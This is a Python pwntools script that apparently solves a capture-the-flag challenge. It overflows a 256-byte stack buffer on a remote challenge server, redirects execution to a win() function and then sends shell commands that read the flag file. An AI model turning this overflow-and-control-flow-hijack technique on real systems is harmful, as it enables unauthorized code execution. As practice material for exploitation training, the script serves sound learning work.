from pwn import *

# Set up the binary context
exe = "./chal"
elf = ELF(exe, checksec=False)

# Connect to remote
io = remote("amt.rs", 30382)

# 1. Send a large size to trigger the overflow capability
io.sendlineafter(b"write? ", b"1000")

# 2. Construct Payload
# Buffer is 0x100 (256 bytes)
# Offset = 256 (buffer) + 8 (saved rbp) = 264
offset = 264

# Get win function address
win_addr = elf.symbols["win"]
print(f"[+] win() address: {hex(win_addr)}")

# Simple ret gadget for stack alignment (typical for x64)
ret_gadget = 0x40101A

payload = b"A" * offset
payload += p64(ret_gadget)  # Stack alignment
payload += p64(win_addr)  # Jump to win()

print(f"[+] Payload length: {len(payload)}")

# 3. Send payload
io.sendline(payload)

# Give it a moment for the shell to spawn
sleep(0.5)

# Send command to get flag
io.sendline(b"cat flag")
io.sendline(b"cat /srv/app/flag")
io.sendline(b"ls")

# Get the output
try:
    output = io.recvall(timeout=3)
    print("\n" + "=" * 60)
    print("OUTPUT:")
    print("=" * 60)
    print(output.decode())
except Exception as e:
    print(f"Error: {e}")
    try:
        print(io.recvrepeat(timeout=2).decode())
    except:
        pass

io.close()
